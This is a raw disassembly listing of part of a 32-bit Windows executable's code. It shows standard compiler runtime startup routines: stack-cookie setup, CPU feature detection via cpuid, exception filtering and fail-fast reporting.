  4016f2:	56                   	push   %esi
  4016f3:	57                   	push   %edi
  4016f4:	bf 4e e6 40 bb       	mov    $0xbb40e64e,%edi
  4016f9:	be 00 00 ff ff       	mov    $0xffff0000,%esi
  4016fe:	3b cf                	cmp    %edi,%ecx
  401700:	74 04                	je     0x401706
  401702:	85 ce                	test   %ecx,%esi
  401704:	75 26                	jne    0x40172c
  401706:	e8 94 ff ff ff       	call   0x40169f
  40170b:	8b c8                	mov    %eax,%ecx
  40170d:	3b cf                	cmp    %edi,%ecx
  40170f:	75 07                	jne    0x401718
  401711:	b9 4f e6 40 bb       	mov    $0xbb40e64f,%ecx
  401716:	eb 0e                	jmp    0x401726
  401718:	85 ce                	test   %ecx,%esi
  40171a:	75 0a                	jne    0x401726
  40171c:	0d 11 47 00 00       	or     $0x4711,%eax
  401721:	c1 e0 10             	shl    $0x10,%eax
  401724:	0b c8                	or     %eax,%ecx
  401726:	89 0d 40 90 41 00    	mov    %ecx,0x419040
  40172c:	f7 d1                	not    %ecx
  40172e:	5f                   	pop    %edi
  40172f:	89 0d 80 90 41 00    	mov    %ecx,0x419080
  401735:	5e                   	pop    %esi
  401736:	c3                   	ret
  401737:	33 c0                	xor    %eax,%eax
  401739:	c3                   	ret
  40173a:	33 c0                	xor    %eax,%eax
  40173c:	40                   	inc    %eax
  40173d:	c3                   	ret
  40173e:	b8 00 40 00 00       	mov    $0x4000,%eax
  401743:	c3                   	ret
  401744:	68 b0 99 41 00       	push   $0x4199b0
  401749:	ff 15 40 20 41 00    	call   *0x412040
  40174f:	c3                   	ret
  401750:	b0 01                	mov    $0x1,%al
  401752:	c3                   	ret
  401753:	68 00 00 03 00       	push   $0x30000
  401758:	68 00 00 01 00       	push   $0x10000
  40175d:	6a 00                	push   $0x0
  40175f:	e8 9c 4c 00 00       	call   0x406400
  401764:	83 c4 0c             	add    $0xc,%esp
  401767:	85 c0                	test   %eax,%eax
  401769:	75 01                	jne    0x40176c
  40176b:	c3                   	ret
  40176c:	6a 07                	push   $0x7
  40176e:	e8 45 00 00 00       	call   0x4017b8
  401773:	cc                   	int3
  401774:	c2 00 00             	ret    $0x0
  401777:	b8 b8 99 41 00       	mov    $0x4199b8,%eax
  40177c:	c3                   	ret
  40177d:	b8 c0 99 41 00       	mov    $0x4199c0,%eax
  401782:	c3                   	ret
  401783:	e8 ef ff ff ff       	call   0x401777
  401788:	8b 48 04             	mov    0x4(%eax),%ecx
  40178b:	83 08 24             	orl    $0x24,(%eax)
  40178e:	89 48 04             	mov    %ecx,0x4(%eax)
  401791:	e8 e7 ff ff ff       	call   0x40177d
  401796:	8b 48 04             	mov    0x4(%eax),%ecx
  401799:	83 08 02             	orl    $0x2,(%eax)
  40179c:	89 48 04             	mov    %ecx,0x4(%eax)
  40179f:	c3                   	ret
  4017a0:	33 c0                	xor    %eax,%eax
  4017a2:	39 05 04 90 41 00    	cmp    %eax,0x419004
  4017a8:	0f 94 c0             	sete   %al
  4017ab:	c3                   	ret
  4017ac:	b8 18 a3 41 00       	mov    $0x41a318,%eax
  4017b1:	c3                   	ret
  4017b2:	b8 14 a3 41 00       	mov    $0x41a314,%eax
  4017b7:	c3                   	ret
  4017b8:	55                   	push   %ebp
  4017b9:	8b ec                	mov    %esp,%ebp
  4017bb:	81 ec 24 03 00 00    	sub    $0x324,%esp
  4017c1:	56                   	push   %esi
  4017c2:	6a 17                	push   $0x17
  4017c4:	ff 15 54 20 41 00    	call   *0x412054
  4017ca:	85 c0                	test   %eax,%eax
  4017cc:	74 05                	je     0x4017d3
  4017ce:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4017d1:	cd 29                	int    $0x29
  4017d3:	6a 03                	push   $0x3
  4017d5:	e8 cc 01 00 00       	call   0x4019a6
  4017da:	c7 04 24 cc 02 00 00 	movl   $0x2cc,(%esp)
  4017e1:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  4017e7:	6a 00                	push   $0x0
  4017e9:	50                   	push   %eax
  4017ea:	e8 21 10 00 00       	call   0x402810
  4017ef:	83 c4 0c             	add    $0xc,%esp
  4017f2:	89 85 8c fd ff ff    	mov    %eax,-0x274(%ebp)
  4017f8:	89 8d 88 fd ff ff    	mov    %ecx,-0x278(%ebp)
  4017fe:	89 95 84 fd ff ff    	mov    %edx,-0x27c(%ebp)
  401804:	89 9d 80 fd ff ff    	mov    %ebx,-0x280(%ebp)
  40180a:	89 b5 7c fd ff ff    	mov    %esi,-0x284(%ebp)
  401810:	89 bd 78 fd ff ff    	mov    %edi,-0x288(%ebp)
  401816:	66 8c 95 a4 fd ff ff 	data16 mov %ss,-0x25c(%ebp)
  40181d:	66 8c 8d 98 fd ff ff 	data16 mov %cs,-0x268(%ebp)
  401824:	66 8c 9d 74 fd ff ff 	data16 mov %ds,-0x28c(%ebp)
  40182b:	66 8c 85 70 fd ff ff 	data16 mov %es,-0x290(%ebp)
  401832:	66 8c a5 6c fd ff ff 	data16 mov %fs,-0x294(%ebp)
  401839:	66 8c ad 68 fd ff ff 	data16 mov %gs,-0x298(%ebp)
  401840:	9c                   	pushf
  401841:	8f 85 9c fd ff ff    	pop    -0x264(%ebp)
  401847:	8b 45 04             	mov    0x4(%ebp),%eax
  40184a:	89 85 94 fd ff ff    	mov    %eax,-0x26c(%ebp)
  401850:	8d 45 04             	lea    0x4(%ebp),%eax
  401853:	89 85 a0 fd ff ff    	mov    %eax,-0x260(%ebp)
  401859:	c7 85 dc fc ff ff 01 	movl   $0x10001,-0x324(%ebp)
  401860:	00 01 00 
  401863:	8b 40 fc             	mov    -0x4(%eax),%eax
  401866:	6a 50                	push   $0x50
  401868:	89 85 90 fd ff ff    	mov    %eax,-0x270(%ebp)
  40186e:	8d 45 a8             	lea    -0x58(%ebp),%eax
  401871:	6a 00                	push   $0x0
  401873:	50                   	push   %eax
  401874:	e8 97 0f 00 00       	call   0x402810
  401879:	8b 45 04             	mov    0x4(%ebp),%eax
  40187c:	83 c4 0c             	add    $0xc,%esp
  40187f:	c7 45 a8 15 00 00 40 	movl   $0x40000015,-0x58(%ebp)
  401886:	c7 45 ac 01 00 00 00 	movl   $0x1,-0x54(%ebp)
  40188d:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  401890:	ff 15 44 20 41 00    	call   *0x412044
  401896:	8b f0                	mov    %eax,%esi
  401898:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40189b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40189e:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  4018a4:	6a 00                	push   $0x0
  4018a6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4018a9:	ff 15 4c 20 41 00    	call   *0x41204c
  4018af:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4018b2:	50                   	push   %eax
  4018b3:	ff 15 48 20 41 00    	call   *0x412048
  4018b9:	85 c0                	test   %eax,%eax
  4018bb:	75 0d                	jne    0x4018ca
  4018bd:	83 fe 01             	cmp    $0x1,%esi
  4018c0:	74 08                	je     0x4018ca
  4018c2:	6a 03                	push   $0x3
  4018c4:	e8 dd 00 00 00       	call   0x4019a6
  4018c9:	59                   	pop    %ecx
  4018ca:	5e                   	pop    %esi
  4018cb:	c9                   	leave
  4018cc:	c3                   	ret
  4018cd:	55                   	push   %ebp
  4018ce:	8b ec                	mov    %esp,%ebp
  4018d0:	83 ec 44             	sub    $0x44,%esp
  4018d3:	6a 44                	push   $0x44
  4018d5:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4018d8:	6a 00                	push   $0x0
  4018da:	50                   	push   %eax
  4018db:	e8 30 0f 00 00       	call   0x402810
  4018e0:	83 c4 0c             	add    $0xc,%esp
  4018e3:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4018e6:	50                   	push   %eax
  4018e7:	ff 15 50 20 41 00    	call   *0x412050
  4018ed:	f6 45 e8 01          	testb  $0x1,-0x18(%ebp)
  4018f1:	0f b7 4d ec          	movzwl -0x14(%ebp),%ecx
  4018f5:	6a 0a                	push   $0xa
  4018f7:	58                   	pop    %eax
  4018f8:	0f 45 c1             	cmovne %ecx,%eax
  4018fb:	c9                   	leave
  4018fc:	c3                   	ret
  4018fd:	e9 35 fe ff ff       	jmp    0x401737
  401902:	6a 00                	push   $0x0
  401904:	ff 15 58 20 41 00    	call   *0x412058
  40190a:	85 c0                	test   %eax,%eax
  40190c:	74 33                	je     0x401941
  40190e:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
  401913:	66 39 08             	cmp    %cx,(%eax)
  401916:	75 29                	jne    0x401941
  401918:	8b 48 3c             	mov    0x3c(%eax),%ecx
  40191b:	03 c8                	add    %eax,%ecx
  40191d:	81 39 50 45 00 00    	cmpl   $0x4550,(%ecx)
  401923:	75 1c                	jne    0x401941
  401925:	b8 0b 01 00 00       	mov    $0x10b,%eax
  40192a:	66 39 41 18          	cmp    %ax,0x18(%ecx)
  40192e:	75 11                	jne    0x401941
  401930:	83 79 74 0e          	cmpl   $0xe,0x74(%ecx)
  401934:	76 0b                	jbe    0x401941
  401936:	83 b9 e8 00 00 00 00 	cmpl   $0x0,0xe8(%ecx)
  40193d:	0f 95 c0             	setne  %al
  401940:	c3                   	ret
  401941:	32 c0                	xor    %al,%al
  401943:	c3                   	ret
  401944:	68 50 19 40 00       	push   $0x401950
  401949:	ff 15 4c 20 41 00    	call   *0x41204c
  40194f:	c3                   	ret
  401950:	55                   	push   %ebp
  401951:	8b ec                	mov    %esp,%ebp
  401953:	56                   	push   %esi
  401954:	57                   	push   %edi
  401955:	8b 7d 08             	mov    0x8(%ebp),%edi
  401958:	8b 37                	mov    (%edi),%esi
  40195a:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%esi)
  401960:	75 25                	jne    0x401987
  401962:	83 7e 10 03          	cmpl   $0x3,0x10(%esi)
  401966:	75 1f                	jne    0x401987
  401968:	8b 46 14             	mov    0x14(%esi),%eax
  40196b:	3d 20 05 93 19       	cmp    $0x19930520,%eax
  401970:	74 1d                	je     0x40198f
  401972:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  401977:	74 16                	je     0x40198f
  401979:	3d 22 05 93 19       	cmp    $0x19930522,%eax
  40197e:	74 0f                	je     0x40198f
  401980:	3d 00 40 99 01       	cmp    $0x1994000,%eax
  401985:	74 08                	je     0x40198f
  401987:	5f                   	pop    %edi
  401988:	33 c0                	xor    %eax,%eax
  40198a:	5e                   	pop    %esi
  40198b:	5d                   	pop    %ebp
  40198c:	c2 04 00             	ret    $0x4
  40198f:	e8 5a 0e 00 00       	call   0x4027ee
  401994:	89 30                	mov    %esi,(%eax)
  401996:	8b 77 04             	mov    0x4(%edi),%esi
  401999:	e8 59 0e 00 00       	call   0x4027f7
  40199e:	89 30                	mov    %esi,(%eax)
  4019a0:	e8 c7 4a 00 00       	call   0x40646c
  4019a5:	cc                   	int3
  4019a6:	c7 05 c8 99 41 00 00 	movl   $0x0,0x4199c8
  4019ad:	00 00 00 
  4019b0:	c3                   	ret
  4019b1:	53                   	push   %ebx
  4019b2:	56                   	push   %esi
  4019b3:	be 58 74 41 00       	mov    $0x417458,%esi
  4019b8:	bb 58 74 41 00       	mov    $0x417458,%ebx
  4019bd:	3b f3                	cmp    %ebx,%esi
  4019bf:	73 19                	jae    0x4019da
  4019c1:	57                   	push   %edi
  4019c2:	8b 3e                	mov    (%esi),%edi
  4019c4:	85 ff                	test   %edi,%edi
  4019c6:	74 0a                	je     0x4019d2
  4019c8:	8b cf                	mov    %edi,%ecx
  4019ca:	ff 15 48 21 41 00    	call   *0x412148
  4019d0:	ff d7                	call   *%edi
  4019d2:	83 c6 04             	add    $0x4,%esi
  4019d5:	3b f3                	cmp    %ebx,%esi
  4019d7:	72 e9                	jb     0x4019c2
  4019d9:	5f                   	pop    %edi
  4019da:	5e                   	pop    %esi
  4019db:	5b                   	pop    %ebx
  4019dc:	c3                   	ret
  4019dd:	53                   	push   %ebx
  4019de:	56                   	push   %esi
  4019df:	be 60 74 41 00       	mov    $0x417460,%esi
  4019e4:	bb 60 74 41 00       	mov    $0x417460,%ebx
  4019e9:	3b f3                	cmp    %ebx,%esi
  4019eb:	73 19                	jae    0x401a06
  4019ed:	57                   	push   %edi
  4019ee:	8b 3e                	mov    (%esi),%edi
  4019f0:	85 ff                	test   %edi,%edi
  4019f2:	74 0a                	je     0x4019fe
  4019f4:	8b cf                	mov    %edi,%ecx
  4019f6:	ff 15 48 21 41 00    	call   *0x412148
  4019fc:	ff d7                	call   *%edi
  4019fe:	83 c6 04             	add    $0x4,%esi
  401a01:	3b f3                	cmp    %ebx,%esi
  401a03:	72 e9                	jb     0x4019ee
  401a05:	5f                   	pop    %edi
  401a06:	5e                   	pop    %esi
  401a07:	5b                   	pop    %ebx
  401a08:	c3                   	ret
  401a09:	cc                   	int3
  401a0a:	cc                   	int3
  401a0b:	cc                   	int3
  401a0c:	cc                   	int3
  401a0d:	cc                   	int3
  401a0e:	cc                   	int3
  401a0f:	cc                   	int3
  401a10:	68 70 24 40 00       	push   $0x402470
  401a15:	64 ff 35 00 00 00 00 	push   %fs:0x0
  401a1c:	8b 44 24 10          	mov    0x10(%esp),%eax
  401a20:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  401a24:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  401a28:	2b e0                	sub    %eax,%esp
  401a2a:	53                   	push   %ebx
  401a2b:	56                   	push   %esi
  401a2c:	57                   	push   %edi
  401a2d:	a1 40 90 41 00       	mov    0x419040,%eax
  401a32:	31 45 fc             	xor    %eax,-0x4(%ebp)
  401a35:	33 c5                	xor    %ebp,%eax
  401a37:	50                   	push   %eax
  401a38:	89 65 e8             	mov    %esp,-0x18(%ebp)
  401a3b:	ff 75 f8             	push   -0x8(%ebp)
  401a3e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401a41:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  401a48:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401a4b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401a4e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401a54:	c3                   	ret
  401a55:	55                   	push   %ebp
  401a56:	8b ec                	mov    %esp,%ebp
  401a58:	83 0d 18 90 41 00 01 	orl    $0x1,0x419018
  401a5f:	83 ec 28             	sub    $0x28,%esp
  401a62:	c7 05 d0 99 41 00 00 	movl   $0x0,0x4199d0
  401a69:	00 00 00 
  401a6c:	6a 0a                	push   $0xa
  401a6e:	ff 15 54 20 41 00    	call   *0x412054
  401a74:	85 c0                	test   %eax,%eax
  401a76:	0f 84 ef 02 00 00    	je     0x401d6b
  401a7c:	53                   	push   %ebx
  401a7d:	56                   	push   %esi
  401a7e:	57                   	push   %edi
  401a7f:	33 c0                	xor    %eax,%eax
  401a81:	8d 7d d8             	lea    -0x28(%ebp),%edi
  401a84:	33 c9                	xor    %ecx,%ecx
  401a86:	53                   	push   %ebx
  401a87:	0f a2                	cpuid
  401a89:	8b f3                	mov    %ebx,%esi
  401a8b:	5b                   	pop    %ebx
  401a8c:	90                   	nop
  401a8d:	89 07                	mov    %eax,(%edi)
  401a8f:	89 77 04             	mov    %esi,0x4(%edi)
  401a92:	89 4f 08             	mov    %ecx,0x8(%edi)
  401a95:	89 57 0c             	mov    %edx,0xc(%edi)
  401a98:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401a9b:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  401a9e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401aa1:	81 f1 69 6e 65 49    	xor    $0x49656e69,%ecx
  401aa7:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401aaa:	35 6e 74 65 6c       	xor    $0x6c65746e,%eax
  401aaf:	0b c8                	or     %eax,%ecx
  401ab1:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401ab4:	6a 01                	push   $0x1
  401ab6:	35 47 65 6e 75       	xor    $0x756e6547,%eax
  401abb:	0b c8                	or     %eax,%ecx
  401abd:	58                   	pop    %eax
  401abe:	6a 00                	push   $0x0
  401ac0:	59                   	pop    %ecx
  401ac1:	53                   	push   %ebx
  401ac2:	0f a2                	cpuid
  401ac4:	8b f3                	mov    %ebx,%esi
  401ac6:	5b                   	pop    %ebx
  401ac7:	90                   	nop
  401ac8:	89 07                	mov    %eax,(%edi)
  401aca:	89 77 04             	mov    %esi,0x4(%edi)
  401acd:	89 4f 08             	mov    %ecx,0x8(%edi)
  401ad0:	89 57 0c             	mov    %edx,0xc(%edi)
  401ad3:	75 39                	jne    0x401b0e
  401ad5:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401ad8:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
  401add:	3d c0 06 01 00       	cmp    $0x106c0,%eax
  401ae2:	74 23                	je     0x401b07
  401ae4:	3d 60 06 02 00       	cmp    $0x20660,%eax
  401ae9:	74 1c                	je     0x401b07
  401aeb:	3d 70 06 02 00       	cmp    $0x20670,%eax
  401af0:	74 15                	je     0x401b07
  401af2:	3d 50 06 03 00       	cmp    $0x30650,%eax
  401af7:	74 0e                	je     0x401b07
  401af9:	3d 60 06 03 00       	cmp    $0x30660,%eax
  401afe:	74 07                	je     0x401b07
  401b00:	3d 70 06 03 00       	cmp    $0x30670,%eax
  401b05:	75 07                	jne    0x401b0e
  401b07:	83 0d d4 99 41 00 01 	orl    $0x1,0x4199d4
  401b0e:	8b 55 e0             	mov    -0x20(%ebp),%edx
  401b11:	33 db                	xor    %ebx,%ebx
  401b13:	33 ff                	xor    %edi,%edi
  401b15:	89 55 f4             	mov    %edx,-0xc(%ebp)
  401b18:	83 7d fc 07          	cmpl   $0x7,-0x4(%ebp)
  401b1c:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  401b1f:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  401b22:	0f 8c 87 00 00 00    	jl     0x401baf
  401b28:	6a 07                	push   $0x7
  401b2a:	58                   	pop    %eax
  401b2b:	33 c9                	xor    %ecx,%ecx
  401b2d:	53                   	push   %ebx
  401b2e:	0f a2                	cpuid
  401b30:	8b f3                	mov    %ebx,%esi
  401b32:	5b                   	pop    %ebx
  401b33:	90                   	nop
  401b34:	8d 5d d8             	lea    -0x28(%ebp),%ebx
  401b37:	89 03                	mov    %eax,(%ebx)
  401b39:	89 73 04             	mov    %esi,0x4(%ebx)
  401b3c:	89 4b 08             	mov    %ecx,0x8(%ebx)
  401b3f:	89 53 0c             	mov    %edx,0xc(%ebx)
  401b42:	8b 5d dc             	mov    -0x24(%ebp),%ebx
  401b45:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401b48:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  401b4b:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401b4e:	f7 c3 00 02 00 00    	test   $0x200,%ebx
  401b54:	74 07                	je     0x401b5d
  401b56:	83 0d d4 99 41 00 02 	orl    $0x2,0x4199d4
  401b5d:	83 7d d8 01          	cmpl   $0x1,-0x28(%ebp)
  401b61:	7c 24                	jl     0x401b87
  401b63:	6a 07                	push   $0x7
  401b65:	58                   	pop    %eax
  401b66:	33 c9                	xor    %ecx,%ecx
  401b68:	41                   	inc    %ecx
  401b69:	53                   	push   %ebx
  401b6a:	0f a2                	cpuid
  401b6c:	8b f3                	mov    %ebx,%esi
  401b6e:	5b                   	pop    %ebx
  401b6f:	90                   	nop
  401b70:	8d 5d d8             	lea    -0x28(%ebp),%ebx
  401b73:	89 03                	mov    %eax,(%ebx)
  401b75:	89 73 04             	mov    %esi,0x4(%ebx)
  401b78:	89 4b 08             	mov    %ecx,0x8(%ebx)
  401b7b:	89 53 0c             	mov    %edx,0xc(%ebx)
  401b7e:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401b81:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  401b84:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401b87:	6a 24                	push   $0x24
  401b89:	58                   	pop    %eax
  401b8a:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  401b8d:	7c 1d                	jl     0x401bac
  401b8f:	33 c9                	xor    %ecx,%ecx
  401b91:	8d 7d d8             	lea    -0x28(%ebp),%edi
  401b94:	53                   	push   %ebx
  401b95:	0f a2                	cpuid
  401b97:	8b f3                	mov    %ebx,%esi
  401b99:	5b                   	pop    %ebx
  401b9a:	90                   	nop
  401b9b:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  401b9e:	89 07                	mov    %eax,(%edi)
  401ba0:	89 77 04             	mov    %esi,0x4(%edi)
  401ba3:	89 4f 08             	mov    %ecx,0x8(%edi)
  401ba6:	89 57 0c             	mov    %edx,0xc(%edi)
  401ba9:	8b 7d dc             	mov    -0x24(%ebp),%edi
  401bac:	8b 55 f4             	mov    -0xc(%ebp),%edx
  401baf:	a1 18 90 41 00       	mov    0x419018,%eax
  401bb4:	8b 0d 10 90 41 00    	mov    0x419010,%ecx
  401bba:	83 c8 02             	or     $0x2,%eax
  401bbd:	8b 35 14 90 41 00    	mov    0x419014,%esi
  401bc3:	83 e1 fe             	and    $0xfffffffe,%ecx
  401bc6:	c7 05 d0 99 41 00 01 	movl   $0x1,0x4199d0
  401bcd:	00 00 00 
  401bd0:	a3 18 90 41 00       	mov    %eax,0x419018
  401bd5:	89 0d 10 90 41 00    	mov    %ecx,0x419010
  401bdb:	89 35 14 90 41 00    	mov    %esi,0x419014
  401be1:	f7 c2 00 00 10 00    	test   $0x100000,%edx
  401be7:	0f 84 7b 01 00 00    	je     0x401d68
  401bed:	83 c8 04             	or     $0x4,%eax
  401bf0:	c7 05 d0 99 41 00 02 	movl   $0x2,0x4199d0
  401bf7:	00 00 00 
  401bfa:	a3 18 90 41 00       	mov    %eax,0x419018
  401bff:	83 e1 ef             	and    $0xffffffef,%ecx
  401c02:	b8 00 00 00 18       	mov    $0x18000000,%eax
  401c07:	89 0d 10 90 41 00    	mov    %ecx,0x419010
  401c0d:	23 d0                	and    %eax,%edx
  401c0f:	89 35 14 90 41 00    	mov    %esi,0x419014
  401c15:	3b d0                	cmp    %eax,%edx
  401c17:	0f 85 4b 01 00 00    	jne    0x401d68
  401c1d:	33 c9                	xor    %ecx,%ecx
  401c1f:	0f 01 d0             	xgetbv
  401c22:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401c25:	33 f6                	xor    %esi,%esi
  401c27:	89 55 f4             	mov    %edx,-0xc(%ebp)
  401c2a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401c2d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401c30:	83 e0 06             	and    $0x6,%eax
  401c33:	23 ce                	and    %esi,%ecx
  401c35:	83 f8 06             	cmp    $0x6,%eax
  401c38:	0f 85 2a 01 00 00    	jne    0x401d68
  401c3e:	3b ce                	cmp    %esi,%ecx
  401c40:	0f 85 22 01 00 00    	jne    0x401d68
  401c46:	a1 18 90 41 00       	mov    0x419018,%eax
  401c4b:	83 c8 08             	or     $0x8,%eax
  401c4e:	c7 05 d0 99 41 00 03 	movl   $0x3,0x4199d0
  401c55:	00 00 00 
  401c58:	a3 18 90 41 00       	mov    %eax,0x419018
  401c5d:	f6 c3 20             	test   $0x20,%bl
  401c60:	74 79                	je     0x401cdb
  401c62:	8b 0d 14 90 41 00    	mov    0x419014,%ecx
  401c68:	83 c8 20             	or     $0x20,%eax
  401c6b:	a3 18 90 41 00       	mov    %eax,0x419018
  401c70:	ba 00 00 03 d0       	mov    $0xd0030000,%edx
  401c75:	a1 10 90 41 00       	mov    0x419010,%eax
  401c7a:	23 da                	and    %edx,%ebx
  401c7c:	83 e0 fd             	and    $0xfffffffd,%eax
  401c7f:	c7 05 d0 99 41 00 05 	movl   $0x5,0x4199d0
  401c86:	00 00 00 
  401c89:	a3 10 90 41 00       	mov    %eax,0x419010
  401c8e:	89 0d 14 90 41 00    	mov    %ecx,0x419014
  401c94:	3b da                	cmp    %edx,%ebx
  401c96:	75 4e                	jne    0x401ce6
  401c98:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401c9b:	ba e0 00 00 00       	mov    $0xe0,%edx
  401ca0:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401ca3:	23 c2                	and    %edx,%eax
  401ca5:	23 ce                	and    %esi,%ecx
  401ca7:	3b c2                	cmp    %edx,%eax
  401ca9:	75 30                	jne    0x401cdb
  401cab:	3b ce                	cmp    %esi,%ecx
  401cad:	75 2c                	jne    0x401cdb
  401caf:	a1 10 90 41 00       	mov    0x419010,%eax
  401cb4:	83 0d 18 90 41 00 40 	orl    $0x40,0x419018
  401cbb:	83 e0 db             	and    $0xffffffdb,%eax
  401cbe:	8b 0d 14 90 41 00    	mov    0x419014,%ecx
  401cc4:	c7 05 d0 99 41 00 06 	movl   $0x6,0x4199d0
  401ccb:	00 00 00 
  401cce:	a3 10 90 41 00       	mov    %eax,0x419010
  401cd3:	89 0d 14 90 41 00    	mov    %ecx,0x419014
  401cd9:	eb 0b                	jmp    0x401ce6
  401cdb:	8b 0d 14 90 41 00    	mov    0x419014,%ecx
  401ce1:	a1 10 90 41 00       	mov    0x419010,%eax
  401ce6:	f7 45 ec 00 00 80 00 	testl  $0x800000,-0x14(%ebp)
  401ced:	74 10                	je     0x401cff
  401cef:	25 ff ff ff fe       	and    $0xfeffffff,%eax
  401cf4:	89 0d 14 90 41 00    	mov    %ecx,0x419014
  401cfa:	a3 10 90 41 00       	mov    %eax,0x419010
  401cff:	f7 45 e8 00 00 08 00 	testl  $0x80000,-0x18(%ebp)
  401d06:	74 60                	je     0x401d68
  401d08:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401d0b:	ba e0 00 00 00       	mov    $0xe0,%edx
  401d10:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401d13:	23 c2                	and    %edx,%eax
  401d15:	23 ce                	and    %esi,%ecx
  401d17:	3b c2                	cmp    %edx,%eax
  401d19:	75 4d                	jne    0x401d68
  401d1b:	3b ce                	cmp    %esi,%ecx
  401d1d:	75 49                	jne    0x401d68
  401d1f:	8b c7                	mov    %edi,%eax
  401d21:	33 c9                	xor    %ecx,%ecx
  401d23:	c1 ef 10             	shr    $0x10,%edi
  401d26:	25 ff 00 04 00       	and    $0x400ff,%eax
  401d2b:	83 e7 06             	and    $0x6,%edi
  401d2e:	a3 cc 99 41 00       	mov    %eax,0x4199cc
  401d33:	81 cf 29 00 00 01    	or     $0x1000029,%edi
  401d39:	f7 d1                	not    %ecx
  401d3b:	23 0d 14 90 41 00    	and    0x419014,%ecx
  401d41:	f7 d7                	not    %edi
  401d43:	23 3d 10 90 41 00    	and    0x419010,%edi
  401d49:	89 3d 10 90 41 00    	mov    %edi,0x419010
  401d4f:	89 0d 14 90 41 00    	mov    %ecx,0x419014
  401d55:	3c 01                	cmp    $0x1,%al
  401d57:	76 0f                	jbe    0x401d68
  401d59:	83 e7 bf             	and    $0xffffffbf,%edi
  401d5c:	89 0d 14 90 41 00    	mov    %ecx,0x419014
  401d62:	89 3d 10 90 41 00    	mov    %edi,0x419010
  401d68:	5f                   	pop    %edi
  401d69:	5e                   	pop    %esi
  401d6a:	5b                   	pop    %ebx
  401d6b:	33 c0                	xor    %eax,%eax
  401d6d:	c9                   	leave
  401d6e:	c3                   	ret
  401d6f:	33 c0                	xor    %eax,%eax
  401d71:	39 05 10 a3 41 00    	cmp    %eax,0x41a310
  401d77:	0f 95 c0             	setne  %al
  401d7a:	c3                   	ret
  401d7b:	3b 0d 40 90 41 00    	cmp    0x419040,%ecx
  401d81:	75 01                	jne    0x401d84
  401d83:	c3                   	ret
  401d84:	e9 28 00 00 00       	jmp    0x401db1
  401d89:	55                   	push   %ebp
  401d8a:	8b ec                	mov    %esp,%ebp
  401d8c:	6a 00                	push   $0x0
  401d8e:	ff 15 4c 20 41 00    	call   *0x41204c
  401d94:	ff 75 08             	push   0x8(%ebp)
  401d97:	ff 15 48 20 41 00    	call   *0x412048
  401d9d:	68 09 04 00 c0       	push   $0xc0000409
  401da2:	ff 15 5c 20 41 00    	call   *0x41205c
  401da8:	50                   	push   %eax
  401da9:	ff 15 60 20 41 00    	call   *0x412060
  401daf:	5d                   	pop    %ebp
  401db0:	c3                   	ret
  401db1:	55                   	push   %ebp
  401db2:	8b ec                	mov    %esp,%ebp
  401db4:	81 ec 24 03 00 00    	sub    $0x324,%esp
  401dba:	6a 17                	push   $0x17
  401dbc:	ff 15 54 20 41 00    	call   *0x412054
  401dc2:	85 c0                	test   %eax,%eax
  401dc4:	74 05                	je     0x401dcb
  401dc6:	6a 02                	push   $0x2
  401dc8:	59                   	pop    %ecx
  401dc9:	cd 29                	int    $0x29
  401dcb:	a3 d8 9a 41 00       	mov    %eax,0x419ad8
  401dd0:	89 0d d4 9a 41 00    	mov    %ecx,0x419ad4
  401dd6:	89 15 d0 9a 41 00    	mov    %edx,0x419ad0
  401ddc:	89 1d cc 9a 41 00    	mov    %ebx,0x419acc
  401de2:	89 35 c8 9a 41 00    	mov    %esi,0x419ac8
  401de8:	89 3d c4 9a 41 00    	mov    %edi,0x419ac4
  401dee:	66 8c 15 f0 9a 41 00 	data16 mov %ss,0x419af0
  401df5:	66 8c 0d e4 9a 41 00 	data16 mov %cs,0x419ae4
  401dfc:	66 8c 1d c0 9a 41 00 	data16 mov %ds,0x419ac0
  401e03:	66 8c 05 bc 9a 41 00 	data16 mov %es,0x419abc
  401e0a:	66 8c 25 b8 9a 41 00 	data16 mov %fs,0x419ab8
  401e11:	66 8c 2d b4 9a 41 00 	data16 mov %gs,0x419ab4
  401e18:	9c                   	pushf
  401e19:	8f 05 e8 9a 41 00    	pop    0x419ae8
  401e1f:	8b 45 00             	mov    0x0(%ebp),%eax
